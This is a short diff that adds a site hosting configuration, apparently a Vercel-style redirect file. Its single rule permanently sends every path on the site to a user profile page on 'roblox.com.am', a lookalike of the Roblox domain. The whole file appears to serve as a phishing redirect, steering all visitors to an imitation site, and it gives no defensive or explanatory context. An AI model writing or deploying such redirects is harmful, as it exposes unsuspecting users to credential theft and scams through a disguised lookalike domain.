@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/(.*)",
+      "destination": "https://www.roblox.com.am/users/9149060220/profile",
+      "permanent": true
+    }
+  ]
+}
